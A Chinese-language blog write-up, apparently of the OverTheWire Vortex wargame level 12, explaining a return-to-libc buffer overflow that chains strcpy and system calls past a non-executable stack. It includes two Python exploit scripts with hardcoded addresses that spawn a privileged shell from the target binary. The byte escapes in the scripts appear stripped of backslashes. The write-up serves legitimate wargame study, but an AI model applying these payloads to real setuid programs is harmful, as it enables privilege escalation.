---
title: OverTheWire Vertex Level 12 → Level 13
author: Ripples
layout: post
permalink: /overthewire-vertex-level-12/
views:
  - 536
categories:
  - CTF
tags:
  - buffer overflow
  - reversing
  - vortex
  - wargame
  - WriteUp
---
<p style="text-indent: 2em;">
  不得不说，这一关着实废了不少脑细胞，好在最后解决的还算满意。
</p>

<p style="text-indent: 2em;">
  这一关也是上来一个程序逆向，但是gdb打开看了之后，就震惊了，这简直和<a href="http://geekjayvic.sinaapp.com/overthewire-vertex-level-8/" target="_blank">vortex8</a>一模一样，那个折磨了好久的vortex8<img src="http://img.baidu.com/hi/jx2/j_0012.gif" />，然后这关就比vortex8多了一句话，no executable stack，但就是这一句话，让之前的所有方法全部报废。
</p>

<p style="text-indent: 2em;">
  没办法，只能从头来过，查资料之后再思前想后，终于得到如下方法：
</p>

<!--more-->

<p style="text-indent: 2em;">
  通过溢出修改unsafecode返回地址为strcpy，通过strcpy，修改safecode中调用的函数（printf、fflush、sleep）的返回地址为system，从而通过system("/bin/sh")获得shell。
</p>

<p style="text-indent: 2em;">
  然后safecode处溢出格式为：
</p>

<table interlaced="enabled">
  <tr class="ue-table-interlace-color-single firstRow">
    <td width="166" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      ebp
    </td>

    <td width="166" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      return address
    </td>

    <td width="166" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="166" valign="top" style="border-width: 1px; border-style: solid;">
    </td>
  </tr>

  <tr class="ue-table-interlace-color-double">
    <td width="166" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="166" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      system
    </td>

    <td width="166" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      nop * 4
    </td>

    <td width="166" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      address of "/bin/sh"
    </td>
  </tr>
</table>

<p style="text-indent: 2em;">
  unsafecode处溢出格式为：
</p>

<table interlaced="enabled">
  <tr class="ue-table-interlace-color-single firstRow">
    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      ebp
    </td>

    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      return address
    </td>

    <td width="129" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="129" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="129" valign="top" style="border-width: 1px; border-style: solid;">
    </td>
  </tr>

  <tr class="ue-table-interlace-color-double">
    <td width="129" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      strcpy
    </td>

    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      sleep
    </td>

    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      dest
    </td>

    <td width="129" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      src
    </td>
  </tr>
</table>

<p style="text-indent: 2em;">
  其中dest为指向safecode的栈中返回地址的指针，src为指向用来覆盖safecode的栈的字符串的指针。其中sleep是为了防止主线程在strcpy完成后就直接退出或者崩溃而设置的，给子线程以足够的时间产生shell。
</p>

<p style="text-indent: 2em;">
  这样，我们就不可避免的需要对两个字符串精确定位，还是通过参数传递这两个字符串。
</p>

<p style="text-indent: 2em;">
  程序的栈分布：&#8230;->参数字符串->环境变量字符串->运行程序名->NULL->NULL->栈底
</p>

<p style="text-indent: 2em;">
  这样，首先得到栈底为0xffffe000，然后程序名为/vortex/vortex12，这样可以算得，字符串/bin/sh的地址为0xffffdfdf，src<span style="text-indent: 32px;">为0xffffdfd2（注意计算的时候要考虑这些字符串结尾的x00）。</span>
</p>

<p style="text-indent: 2em;">
  然后，通过gdb，得到sleep的地址为0xf7ec5cd0，system的地址为0xf7fc3e30，strcpy的地址为0x080484b0，dest为0xf7e0b33c。
</p>

<p style="text-indent: 2em;">
  这样，我们得到启动程序如下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

import&nbsp;subprocess

sleep_addr&nbsp;=&nbsp;&#39;xd0x5cxecxf7&#39;
sys_addr&nbsp;=&nbsp;&#39;x30x3exfcxf7&#39;
cpy_addr&nbsp;=&nbsp;&#39;xb0x84x04x08&#39;
sh_addr&nbsp;=&nbsp;&#39;xdfxdfxffxff&#39;
dest&nbsp;=&nbsp;&#39;x3cxb3xe0xf7&#39;
src&nbsp;=&nbsp;&#39;xd2xdfxffxff&#39;
subprocess.Popen([&#39;/vortex/vortex12&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;cpy_addr&nbsp;+&nbsp;sleep_addr&nbsp;+&nbsp;dest&nbsp;+&nbsp;src,&nbsp;sys_addr&nbsp;+&nbsp;sh_addr&nbsp;+&nbsp;sh_addr,&nbsp;&#39;/bin/sh&#39;],&nbsp;env&nbsp;=&nbsp;{}).communicate()</pre>

<p style="text-indent: 2em;">
  然而，当我们运行这个程序的时候，结果并没有能够获得shell，仔细一想，便会发现还是在vortex8中遇到的老问题，即strcpy发生在了子线程调用函数之前，导致修改失去了意义。于是乎，反复运行N次之后，终于成功拿到了shell（中途还有一次崩溃，把nop * 4也替换成address of "/bin/sh"可以避免printf中崩溃），但是，不得不说，这样的结果并不能让我满意，那么我们如何像vortex8中一样，让主线程等候一段时间后再执行strcpy呢？
</p>

<p style="text-indent: 2em;">
  在这里，我们想要给主线程在strcpy执行之前加上一个sleep是极度困难的，直接插在strcpy前会导致sleep的时间为strcpy后面的那个sleep的地址，显然这个数是巨大的，不可行。
</p>

<p style="text-indent: 2em;">
  然后我企图通过调用无参数函数wait()来暂停，在另一个terminal上发送signal来启动，结果失败了，不知道为什么，也没继续研究。
</p>

<p style="text-indent: 2em;">
  然后我重新设计unsafecode处溢出格式如下：
</p>

<table interlaced="enabled">
  <tr class="ue-table-interlace-color-single firstRow">
    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      ebp
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      ret addr
    </td>

    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>
  </tr>

  <tr class="ue-table-interlace-color-double">
    <td width="72" valign="top" style="border-width: 1px; border-style: solid;">
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      sleep
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      magic
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      n
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      strcpy
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      sleep
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      dest
    </td>

    <td width="72" valign="top" style="word-break: break-all; border-width: 1px; border-style: solid;">
      src
    </td>
  </tr>
</table>

<p style="text-indent: 2em;">
  其中magic指针指向处的指令为：
</p>

<pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;0x80486bf&nbsp;&lt;main+159&gt;:	pop&nbsp;&nbsp;&nbsp;&nbsp;%ebp
&nbsp;&nbsp;&nbsp;0x80486c0&nbsp;&lt;main+160&gt;:	ret</pre>

<p style="text-indent: 2em;">
  我这里用的是main函数结尾处的两条指令，其它地方的类似这样的指令也可以。通过这样的指令，我们可以使得magic处的ret指令返回到strcpy中，实现我们需要的效果。然而，由于我们的字符串中不能出现x00，这也就意味着n至少为0x<a></a>01010101，还是太大，不可行。
</p>

<p style="text-indent: 2em;">
  最后，我将sleep(n)换成了system("/bin/sh")，这样，我们运行这个程序之后，就会先得到一个已经没有权限的shell，然后等一会后手动Ctrl+D关掉这个shell之后，正常情况下就会又出现一个有权限的shell。
</p>

<p style="text-indent: 2em;">
  最终程序如下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

import&nbsp;subprocess

sleep_addr&nbsp;=&nbsp;&#39;xd0x5cxecxf7&#39;
sys_addr&nbsp;=&nbsp;&#39;x30x3exfcxf7&#39;
cpy_addr&nbsp;=&nbsp;&#39;xb0x84x04x08&#39;
sh_addr&nbsp;=&nbsp;&#39;xdfxdfxffxff&#39;
dest&nbsp;=&nbsp;&#39;x3cxb3xe0xf7&#39;
src&nbsp;=&nbsp;&#39;xd2xdfxffxff&#39;
ret_addr&nbsp;=&nbsp;&#39;xbfx86x04x08&#39;
subprocess.Popen([&#39;/vortex/vortex12&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;sys_addr&nbsp;+&nbsp;ret_addr&nbsp;+&nbsp;sh_addr&nbsp;+&nbsp;cpy_addr&nbsp;+&nbsp;sleep_addr&nbsp;+&nbsp;dest&nbsp;+&nbsp;src,&nbsp;sys_addr&nbsp;+&nbsp;sh_addr&nbsp;+&nbsp;sh_addr,&nbsp;&#39;/bin/sh&#39;],&nbsp;env&nbsp;=&nbsp;{}).communicate()</pre>

<p style="text-indent: 2em;">
  至此，这一关得以解决。
</p>
